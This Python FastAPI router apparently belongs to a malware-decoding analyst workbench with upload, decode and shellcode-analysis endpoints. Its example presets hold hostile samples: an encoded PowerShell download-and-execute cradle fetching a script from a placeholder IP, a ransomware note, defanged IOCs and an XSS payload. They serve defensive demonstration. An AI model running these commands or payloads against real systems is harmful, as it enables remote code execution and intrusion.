"""Operations router — /api/operations, /api/examples, /api/recipe/run, /api/upload,
                       /api/decode/smart, /api/decode/magic,
                       /api/analyze/command, /api/analyze/shellcode.
"""
from __future__ import annotations
import base64 as _b64
import hashlib
import re
from typing import Any, Dict, List, Optional

from fastapi import APIRouter, Depends, File, HTTPException, UploadFile
from pydantic import BaseModel

from schemas import (
    RecipeStep, RunRecipeIn, RunRecipeOut, AutoIn, MagicIn,
    ShellcodeIn, CommandAnalyzeIn,
)
from deps import db, get_current_user
from operations import (
    OPERATIONS, list_operations, run_operation,
    detect_payload_type,
)
from smart_decoder import smart_decode
from magic_decoder import magic_decode
import models_studio as ms

router = APIRouter()


# --- Load Example Presets (moved from server.py) --------------------------- #
EXAMPLES = [
    {
        "id": "powershell-encoded",
        "label": "PowerShell -EncodedCommand",
        "input": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAvAHAALgBwAHMAMQAnACkA",
    },
    {
        "id": "ransomware-note",
        "label": "Ransomware Note",
        "input": "!!! YOUR FILES HAVE BEEN ENCRYPTED !!!\nAll your important documents, photos, databases and other files have been encrypted with military-grade AES-256.\n\nTo restore your files you must pay 0.75 BTC to the following address within 72 hours:\n\nBTC ADDRESS: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\n\nContact us via Tor: http://ransomxyz1abcdef23456789ghijklmn.onion\nEmail: recover-your-files@protonmail.com\n\nDo NOT rename encrypted files. Do NOT try to decrypt with third-party software.\n",
    },
    {
        "id": "defanged-iocs",
        "label": "Defanged IOCs Bundle",
        "input": "IOC dump from IR ticket #4421:\n\nURLs:\n  hxxps://malicious-cdn[.]example[.]com/payload[.]exe\n  hxxp://phish[.]login-microsoft-secure[.]net/auth\n\nIPs:\n  185[.]220[.]101[.]45\n  45[.]137[.]21[.]9\n\nEmails:\n  attacker[@]evilcorp[.]ru\n  admin[@]phish[.]login-microsoft-secure[.]net\n\nHashes:\n  MD5:    e10adc3949ba59abbe56e057f20f883e\n  SHA256: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8\n",
    },
    {
        "id": "nested-base64-gzip",
        "label": "Nested Base64 → gzip",
        "input": "H4sIAIQ5VWoC/xXKyRWAIAwFwFZ+A3ryWYkNBBIRF4LEvXr1PNMNgnWPfoIreib0emHcl2zQQwq2j2d6brCGGt0QDZnuWYlxkiE8MVdel1zETPjvCY5M2qaS5JWF6xdjITdRYgAAAA==",
    },
    {
        "id": "url-encoded-xss",
        "label": "URL-encoded XSS",
        "input": "%3Cscript%3Ealert(String.fromCharCode(88%2C83%2C83))%3C%2Fscript%3E",
    },
]


# --- File upload helpers --------------------------------------------------- #
def _detect_file_type(raw: bytes, filename: str) -> Dict[str, str]:
    magics = [
        (b"MZ", "PE (Windows executable / DLL)", "application/x-dosexec"),
        (b"\x7fELF", "ELF (Linux executable)", "application/x-elf"),
        (b"\xCA\xFE\xBA\xBE", "Java class / Mach-O fat", "application/java-vm"),
        (b"\xFE\xED\xFA", "Mach-O binary", "application/x-mach-binary"),
        (b"PK\x03\x04", "ZIP archive (docx/xlsx/jar/apk possible)", "application/zip"),
        (b"Rar!\x1a\x07", "RAR archive", "application/vnd.rar"),
        (b"\x1f\x8b", "GZIP compressed", "application/gzip"),
        (b"\x42\x5a\x68", "BZIP2 compressed", "application/x-bzip2"),
        (b"\xFD7zXZ", "XZ compressed", "application/x-xz"),
        (b"%PDF-", "PDF document", "application/pdf"),
        (b"\xD0\xCF\x11\xE0", "MS OLE compound (legacy Office / MSI)", "application/x-ole"),
        (b"\x89PNG", "PNG image", "image/png"),
        (b"\xff\xd8\xff", "JPEG image", "image/jpeg"),
        (b"GIF87a", "GIF image", "image/gif"),
        (b"GIF89a", "GIF image", "image/gif"),
        (b"#!/", "Shell script (shebang)", "text/x-shellscript"),
        (b"<?xml", "XML document", "application/xml"),
        (b"{\"", "JSON (likely)", "application/json"),
    ]
    for prefix, label, mime in magics:
        if raw.startswith(prefix):
            return {"label": label, "mime": mime, "extension": _ext(filename)}
    if _mostly_printable(raw[:2048].decode("utf-8", errors="replace")):
        return {"label": "Plain text", "mime": "text/plain", "extension": _ext(filename)}
    return {"label": "Unknown binary", "mime": "application/octet-stream", "extension": _ext(filename)}


def _ext(filename: str) -> str:
    if "." not in filename: return ""
    return filename.rsplit(".", 1)[-1].lower()


def _mostly_printable(s: str, threshold: float = 0.85) -> bool:
    if not s: return False
    printable = sum(1 for c in s if c.isprintable() or c in "\n\r\t")
    return printable / max(1, len(s)) >= threshold


def _hex_dump(data: bytes, width: int = 16) -> str:
    lines = []
    for i in range(0, len(data), width):
        chunk = data[i:i + width]
        hex_part = " ".join(f"{b:02x}" for b in chunk)
        ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        lines.append(f"{i:08x}  {hex_part:<{width * 3}}  {ascii_part}")
    return "\n".join(lines)


def _extract_strings(raw: bytes, min_len: int = 4, limit: int = 400) -> List[str]:
    out, cur = [], []
    for b in raw:
        if 32 <= b < 127:
            cur.append(chr(b))
        else:
            if len(cur) >= min_len:
                out.append("".join(cur))
                if len(out) >= limit: break
            cur = []
    if len(cur) >= min_len and len(out) < limit:
        out.append("".join(cur))
    return out


# --- Endpoints ------------------------------------------------------------- #
@router.get("/operations")
async def get_ops(user=Depends(get_current_user)):
    return list_operations()


@router.get("/examples")
async def get_examples(user=Depends(get_current_user)):
    return EXAMPLES


@router.post("/recipe/run", response_model=RunRecipeOut)
async def run_recipe(body: RunRecipeIn, user=Depends(get_current_user)):
    current = body.input
    steps_output: List[Dict[str, Any]] = []
    errors: List[Dict[str, str]] = []
    for i, step in enumerate(body.steps):
        try:
            current = run_operation(step.op, current, step.args)
            steps_output.append({
                "index": i, "op": step.op,
                "output_preview": current[:400],
                "output_length": len(current),
            })
        except Exception as e:
            errors.append({"index": str(i), "op": step.op, "error": str(e)})
            steps_output.append({"index": i, "op": step.op, "error": str(e)})
            break
    return RunRecipeOut(
        output=current, steps_output=steps_output,
        detected_type=detect_payload_type(current), errors=errors,
    )


@router.post("/upload")
async def upload(file: UploadFile = File(...), user=Depends(get_current_user)):
    """Universal file upload — accepts ANY file format."""
    raw = await file.read()
    size = len(raw)
    hashes = {
        "md5": hashlib.md5(raw).hexdigest(),
        "sha1": hashlib.sha1(raw).hexdigest(),
        "sha256": hashlib.sha256(raw).hexdigest(),
    }
    file_type = _detect_file_type(raw, file.filename or "")
    text = None
    try:
        candidate = raw.decode("utf-8")
        if _mostly_printable(candidate):
            text = candidate
    except UnicodeDecodeError:
        pass
    if text is None:
        try:
            candidate = raw.decode("utf-16-le")
            if _mostly_printable(candidate):
                text = candidate
        except UnicodeDecodeError:
            pass
    hex_dump = _hex_dump(raw[:512])
    strings_out = _extract_strings(raw, min_len=4, limit=400)
    if text is not None:
        content = text[:400_000]
    else:
        content = (
            f"[BINARY FILE — {file.filename}]\n"
            f"Size: {size} bytes\n"
            f"Type: {file_type['label']}\n"
            f"MD5:    {hashes['md5']}\n"
            f"SHA1:   {hashes['sha1']}\n"
            f"SHA256: {hashes['sha256']}\n\n"
            f"── HEX DUMP (first 512 bytes) ──\n{hex_dump}\n\n"
            f"── EXTRACTED STRINGS (top {min(200, len(strings_out))}) ──\n"
            + "\n".join(strings_out[:200])
        )
    return {
        "filename": file.filename, "size": size,
        "hashes": hashes, "file_type": file_type,
        "text": text[:400_000] if text else None,
        "hex_dump": hex_dump, "strings": strings_out, "content": content,
    }


@router.post("/decode/magic")
async def decode_magic(body: MagicIn, user=Depends(get_current_user)):
    """Recursive multi-branch auto-decoder — returns top-N candidate chains + scores."""
    return magic_decode(body.input, max_depth=body.max_depth,
                        max_branches=body.max_branches, top_n=body.top_n)


@router.post("/analyze/command")
async def analyze_command_endpoint(body: CommandAnalyzeIn, user=Depends(get_current_user)):
    """Intelligent Command-Line Analysis Engine — semantic parsing first."""
    from command_analyzer import analyze_command as _ac
    return _ac(body.input, force_decode_span=body.force_decode_span)


@router.post("/analyze/shellcode")
async def analyze_shellcode(body: ShellcodeIn, user=Depends(get_current_user)):
    """Shellcode / binary analysis — auto-detects arch, disassembles via Capstone."""
    from shellcode_analyzer import analyze as _analyze_shellcode
    raw_in = body.input.strip()
    data: bytes = b""
    src = "utf8"
    hex_stripped = re.sub(r"[\s:]", "", raw_in)
    if hex_stripped and len(hex_stripped) % 2 == 0 and re.fullmatch(r"[0-9a-fA-F]+", hex_stripped):
        try:
            data = bytes.fromhex(hex_stripped)
            src = "hex"
        except Exception:
            data = b""
    if not data:
        try:
            b64 = re.sub(r"\s+", "", raw_in)
            data = _b64.b64decode(b64 + "=" * (-len(b64) % 4), validate=False)
            if data:
                src = "base64"
        except Exception:
            data = b""
    if not data:
        data = raw_in.encode("utf-8", errors="replace")
        src = "utf8"
    result = _analyze_shellcode(data, arch=body.arch, max_insns=body.max_insns)
    result["input_source"] = src
    result["input_bytes"] = len(data)
    return result


@router.post("/decode/smart")
async def decode_smart(body: AutoIn, user=Depends(get_current_user)):
    """Custom recipe match first, else deterministic BEST-of {smart, magic}.

    Feb-2026 upgrade: previously used only greedy `smart_decode`, which stopped
    at the loader-script layer on multi-layer stagers. Now uses
    `deterministic_best_decode` (smart+magic race) so this endpoint reaches the
    SAME terminal state as the MAGIC button on every supported payload.
    """
    from analysis_core import deterministic_best_decode

    custom_matches = await ms.find_matching_recipes(db, body.input)
    if custom_matches:
        best = custom_matches[0]
        await ms.increment_usage(db, best["id"])
        try:
            steps_for_run = [RecipeStep(op=s["op"], args=s.get("args") or {})
                             for s in best["ops"] if s.get("op") in OPERATIONS]
            if steps_for_run:
                result_custom = await run_recipe(
                    RunRecipeIn(input=body.input, steps=steps_for_run), user=user,
                )
                recipe_out = [
                    {"op": s.op, "args": s.args, "reason": f"custom recipe: {best['name']}",
                     "custom": True, "model_id": best["id"], "model_name": best["name"]}
                    for s in steps_for_run
                ]
                return {
                    "recipe": recipe_out,
                    "output": result_custom.output,
                    "notes": [f"Applied custom recipe '{best['name']}' from Model Studio"],
                    "detected_type": detect_payload_type(result_custom.output),
                    "engine": "custom_recipe",
                    "reached_shellcode": False,
                    "trace": [
                        {"op": s.op, "args": s.args, "reason": f"custom recipe: {best['name']}",
                         "output_preview": (result_custom.steps_output[i].get("output_preview") or "")
                         if i < len(result_custom.steps_output) else "",
                         "output_length": result_custom.steps_output[i].get("output_length")
                         if i < len(result_custom.steps_output) else None}
                        for i, s in enumerate(steps_for_run)
                    ],
                    "custom_recipes_matched": [
                        {"id": r["id"], "name": r["name"]} for r in custom_matches
                    ],
                }
        except Exception:
            pass

    # Deterministic best-of race (smart vs magic) — this is the key upgrade
    det = deterministic_best_decode(body.input, analysis_mode=body.analysis_mode or "balanced")

    # === Learning Feedback Loop — Task 3 ============================== #
    # Compute the boost BEFORE deciding — we don't rewrite the decoder,
    # we simply attach transparency + record auto-hit/miss so future
    # boosts learn from this outcome. Auto-boost is on unless disabled.
    boost_meta = None
    boost_hit = False
    if not body.disable_boost:
        try:
            from learning.booster import boost as _boost
            from learning.feedback import record_auto
            boost_meta = await _boost(body.input, user["email"])
            if boost_meta.get("enabled") and boost_meta.get("chain"):
                actual_chain = [s["op"] for s in det.get("steps") or []]
                boost_hit = (actual_chain == boost_meta["chain"])
                # Fire-and-forget feedback signal for future ranking
                await record_auto(user["email"], boost_meta["chain"], success=boost_hit)
        except Exception:
            boost_meta = None
    # ================================================================== #

    # Build per-layer trace by re-running the winning chain step-by-step so
    # the frontend Decoding Trace panel has intermediate outputs to display.
    # Note: `extract-payload` is a virtual op that the magic decoder uses
    # internally to strip script wrappers — we handle it here directly via
    # the payload sanitizer.
    from payload_sanitizer import sanitize_encapsulated_payload, find_all_base64_spans
    trace: List[Dict[str, Any]] = []
    cur = body.input
    for step in det.get("steps") or []:
        op_id = step["op"]
        args = step.get("args") or {}
        try:
            if op_id == "extract-payload":
                iso = sanitize_encapsulated_payload(cur)
                if iso and iso != cur.strip():
                    nxt = iso
                else:
                    # nested base64 span extraction
                    spans = find_all_base64_spans(cur, min_len=24)
                    nxt = spans[0] if spans else cur
            else:
                nxt = run_operation(op_id, cur, args)
        except Exception as e:
            trace.append({"op": op_id, "args": args,
                          "error": str(e), "reason": _reason_for_op(op_id)})
            break
        preview = nxt[:400] if isinstance(nxt, str) else str(nxt)[:400]
        trace.append({
            "op": op_id, "args": args,
            "reason": _reason_for_op(op_id),
            "output_preview": preview,
            "output_length": len(nxt) if isinstance(nxt, str) else None,
        })
        cur = nxt

    result = {
        "recipe": [{"op": s["op"], "args": s.get("args") or {}, "reason": _reason_for_op(s["op"])}
                   for s in det.get("steps") or []],
        "output": det.get("output") or "",
        "notes": det.get("notes") or [],
        "detected_type": detect_payload_type(det.get("output") or ""),
        "engine": det.get("engine"),
        "reached_shellcode": det.get("reached_shellcode", False),
        "confidence": int(round(min(1.0, det.get("score", 0.0)) * 100)),
        "trace": trace,
        "custom_recipes_matched": [
            {"id": r["id"], "name": r["name"]} for r in custom_matches
        ],
        "boost": boost_meta,
        "boost_hit": boost_hit,
        # ▲ FORENSIC RULE — corrupted container signal (Feb-2026)
        # When set, the frontend renders a big-red "Corrupted <kind>
        # container" panel with the exact CRC / truncated-stream reason
        # instead of a misleading "high-confidence xor-brute" result.
        "corrupted_container": det.get("corrupted_container"),
        # ▲ REASONING ENGINE — evidence-based trace (Feb-2026)
        # Attached whenever analysis_mode is balanced/deep. Contains input
        # profile (kind, entropy, letter ratios), linguistic delta, and
        # step-by-step "considered / chosen / rejected" reasoning per layer.
        "reasoning": det.get("reasoning"),
        "analysis_mode": body.analysis_mode or "balanced",
    }

    # ▲ SOC EVIDENCE — per-layer metadata (Feb-2026)
    # For every step in the decoding trace, append an `evidence` block:
    # { encoding, length, ascii, entropy, hex_preview, integrity } — feeds
    # the analyst-workbench Layer Metadata panel.
    try:
        from evidence_extractor import layer_metadata, build_verdict_card
        for t in trace:
            after = t.get("output_preview") or ""
            ok = "error" not in t
            reason = t.get("error")
            t["evidence"] = layer_metadata(t.get("op") or "", after,
                                           integrity_ok=ok,
                                           integrity_reason=reason)

        # ── Best-effort container recovery mode ─────────────────────────
        # When the analyst opts into best-effort AND a corrupted container
        # produced a salvaged plaintext, elevate the salvage to the primary
        # output (with a permanent integrity warning appended). Verdict
        # downgrades from Corrupted → Suspicious so the downstream Sample
        # Library / TAXII / SIEM tooling can still ingest the payload.
        cc = result.get("corrupted_container")
        salvaged = (cc or {}).get("salvaged") if cc else None
        mode = (body.mode or "strict").lower()
        if mode == "best_effort" and cc and salvaged:
            result["output"] = (
                f"{salvaged}\n\n"
                f"⚠ Integrity Warning · {cc.get('kind')} trailer invalid: "
                f"{cc.get('reason')}. Payload recovered by best-effort raw "
                f"deflate — CRC / ISIZE could NOT be verified. Treat as "
                f"unverified plaintext until compared against source."
            )
            # keep the corrupted_container object so the UI still shows the
            # ⚠ badge, but note the recovery mode used.
            cc["mode"] = "best_effort"
            # Rebuild verdict card with the elevated context so verdict
            # becomes Suspicious (not Corrupted).
            result["verdict_card"] = build_verdict_card(
                input_text=body.input,
                output_text=salvaged,
                chain=[{"op": s["op"], "args": s.get("args") or {}} for s in det.get("steps") or []],
                corrupted_container=None,   # bypass corrupted short-circuit
            )
            # Prepend an explicit warning indicator so analysts see it up top.
            if result["verdict_card"]:
                result["verdict_card"]["indicators"].insert(0, {
                    "kind":  "negative",
                    "label": (f"⚠ Best-effort recovery — {cc.get('kind')} CRC/ISIZE "
                              f"validation FAILED ({cc.get('reason')}); "
                              f"{len(salvaged)} bytes salvaged unverified."),
                })
                result["verdict_card"]["recommended_action"] = (
                    "Verify salvaged plaintext against source before use. "
                    "Attackers occasionally corrupt archive trailers to evade "
                    "signature-based tooling — treat contents as unverified."
                )
            result["mode"] = "best_effort"
        else:
            # Strict mode — default. Verdict Card + evidence already carry
            # the corrupted state including the salvaged bytes on
            # `corrupted_container.salvaged` for the UI to preview.
            result["verdict_card"] = build_verdict_card(
                input_text=body.input,
                output_text=result["output"],
                chain=[{"op": s["op"], "args": s.get("args") or {}} for s in det.get("steps") or []],
                corrupted_container=result.get("corrupted_container"),
            )
            result["mode"] = "strict"
    except Exception as _e:
        # Never break /decode/smart if evidence extraction hiccups
        result["verdict_card"] = None
        result["verdict_card_error"] = str(_e)
    # Auto-record into user's Investigation History (fire-and-forget, never blocks)
    try:
        from routers.history import record_investigation
        await record_investigation(
            user["email"],
            input=body.input, output=result["output"],
            chain=[s["op"] for s in det.get("steps") or []],
            trace=trace,
            engine=result["engine"], confidence=result["confidence"],
            reached_shellcode=result["reached_shellcode"],
        )
    except Exception:
        pass
    return result

class CandidatesIn(BaseModel):
    input: str
    top_n: int = 8


@router.post("/decode/candidates")
async def decode_candidates(body: CandidatesIn, user=Depends(get_current_user)):
    """Return the RANKED encoding-candidate list for an input.

    Feb-2026 Candidate-Scoring Engine: every registered encoding is scored
    dynamically against the input based on alphabet validity, length rules,
    entropy, decode success, output printability, file signatures, and
    malware indicators. If no candidate reaches MIN_ACCEPT, an
    ``unknown-or-identifier`` verdict is returned with hypotheses (hash /
    UUID / random token / unsupported encoding).

    Output format (per Feb-2026 spec):
        - candidates[]            ranked list with per-candidate evidence
        - best                    top candidate (or None)
        - verdict                 decoded | possible | unknown-or-identifier
        - hex_representation      hex of the best decoded output
        - readability_score       linguistic score of best output
        - signature               file/binary signature (if detected)
        - iocs                    extracted URLs / IPs / domains / hashes / paths
        - lolbins                 detected LOLBins from the winning output
        - mitre_techniques        MITRE ATT&CK mappings
        - explanation             why this encoding was chosen over alternatives
    """
    from reasoning.candidate_engine import (
        score_candidates, classify_unknown, best_candidate,
        HIGH_THRESHOLD, MIN_ACCEPT,
    )
    top_n = max(1, min(int(body.top_n or 8), 20))
    cands = score_candidates(body.input, top_n=top_n)
    best = best_candidate(body.input)
    # Build structured candidate dicts. WINNER gets `as_dict` (no runner-up
    # comparison), all OTHERS get `as_rejected_dict(winner)` so the
    # frontend can render "why not Y?" tooltips.
    candidate_dicts: List[Dict[str, Any]] = []
    for c in cands:
        if best is not None and c.op == best.op:
            candidate_dicts.append(c.as_dict())
        else:
            candidate_dicts.append(c.as_rejected_dict(winner=best))
    payload: Dict[str, Any] = {
        "input_length": len(body.input),
        "candidates": candidate_dicts,
        "best": best.as_dict() if best else None,
        "thresholds": {
            "high": HIGH_THRESHOLD,
            "min_accept": MIN_ACCEPT,
        },
    }
    if best is None:
        payload["verdict"] = classify_unknown(body.input).as_dict()
        payload["hex_representation"] = None
        payload["readability_score"] = None
        payload["signature"] = None
        payload["iocs"] = {}
        payload["lolbins"] = []
        payload["mitre_techniques"] = []
        payload["explanation"] = (
            "No encoding candidate reached the minimum-acceptance threshold "
            f"({MIN_ACCEPT}). See `verdict.hypotheses` for likely alternatives "
            "(hash / UUID / random token / unsupported encoding)."
        )
        return payload

    payload["verdict"] = {
        "verdict": "decoded" if best.confidence >= HIGH_THRESHOLD else "possible",
        "op": best.op,
        "confidence": best.confidence,
        "rationale": best.rationale,
    }

    # ── Full output enrichment on the winning candidate's output ────
    decoded = best.decoded or ""
    try:
        raw = decoded.encode("latin-1", errors="replace") \
            if all(ord(c) < 256 for c in decoded) \
            else decoded.encode("utf-8", errors="replace")
    except Exception:
        raw = b""
    payload["hex_representation"] = raw.hex(" ")
    payload["readability_score"] = round(
        (best.evidence.get("linguistic_score") or 0.0), 4
    )
    payload["signature"] = best.evidence.get("signature")

    # IOCs / MITRE / LOLBins from the DECODED text
    from operations import extract_iocs, mitre_map
    try:
        payload["iocs"] = extract_iocs(decoded)
    except Exception:
        payload["iocs"] = {}
    try:
        payload["mitre_techniques"] = mitre_map(decoded)
    except Exception:
        payload["mitre_techniques"] = []
    try:
        from lolbas import scan_lolbas
        payload["lolbins"] = scan_lolbas(decoded)
    except Exception:
        payload["lolbins"] = []

    # ── "Why this over alternatives" explanation ─────────────────
    # Compare best against the runner-up and articulate the delta.
    if len(cands) >= 2:
        runner = cands[1]
        confidence_gap = round(best.confidence - runner.confidence, 4)
        payload["explanation"] = (
            f"Selected {best.op} (confidence={best.confidence:.2f}) over "
            f"{runner.op} (confidence={runner.confidence:.2f}) — "
            f"gap={confidence_gap:+.2f}. Rationale: {best.rationale} "
            f"| Runner-up rationale: {runner.rationale}"
        )
    else:
        payload["explanation"] = (
            f"Selected {best.op} (confidence={best.confidence:.2f}) — "
            f"only candidate above minimum threshold. {best.rationale}"
        )

    # ── Investigation timeline (Feb-2026 #5): log a "decode" event so
    # the analyst can replay the full lifecycle for this input later.
    try:
        from timeline import record as _tl_record
        await _tl_record(
            db,
            kind="decode",
            title=f"Decoded {best.op} → {(best.decoded or '')[:60]}",
            input_text=body.input,
            actor=user.get("email"),
            summary=(
                f"op={best.op} confidence={best.confidence:.2f} "
                f"verdict={payload['verdict']['verdict']}"
            ),
            metadata={
                "op": best.op,
                "confidence": best.confidence,
                "verdict": payload["verdict"]["verdict"],
                "hex": (payload.get("hex_representation") or "")[:120],
                "iocs": payload.get("iocs") or {},
                "mitre": [t.get("id") for t in (payload.get("mitre_techniques") or [])],
            },
            severity="success" if best.confidence >= 0.65 else "info",
        )
    except Exception:
        pass

    return payload




def _reason_for_op(op: str) -> str:
    """Human-friendly explanation for why the deterministic decoder picked this op."""
    return {
        "extract-payload": "Isolated payload string from script/command wrapper",
        "base64-decode": "Base64-encoded payload detected",
        "base64-gzip": "Base64 → GZIP magic-byte sequence detected (1f 8b)",
        "base64-zlib": "Base64 → ZLIB magic-byte sequence detected (78 xx)",
        "gzip-decompress": "GZIP-compressed layer",
        "zlib-decompress": "ZLIB-compressed layer",
        "lzma-decompress": "LZMA / XZ compressed layer",
        "bzip2-decompress": "BZIP2-compressed layer",
        "hex-decode": "Hex-encoded printable payload",
        "url-decode": "URL percent-encoded characters",
        "html-decode": "HTML entity encoding detected",
        "powershell-encoded": "PowerShell -EncodedCommand base64 (UTF-16LE)",
        "powershell-deobfuscate": "PowerShell tick / [char[]] obfuscation",
        "cmd-deobfuscate": "CMD.exe caret obfuscation",
        "refang-iocs": "Defanged IOCs (hxxp / [.] / [@])",
        "js-charcode": "JavaScript String.fromCharCode()",
        "js-charcode-decode": "JavaScript String.fromCharCode() blocks",
        "js-hex-strings-decode": r"JavaScript \xNN hex string escapes",
        "js-unescape": "JavaScript \\xNN hex escapes",
        "unicode-escape": "\\uNNNN unicode escapes",
        "utf16le-decode": "UTF-16LE byte pattern",
        "xor": "Single-byte XOR key recovered from wrapper",
        "xor-brute": "Multi-byte XOR key recovered via English-density + downstream-magic brute force",
        "env-expand": "Resolved %TEMP% / $env:* / ${HOME} placeholders",
        "extract-base64": "Extracted embedded base64 blob(s) from wrapper text",
    }.get(op, f"Applied {op}")
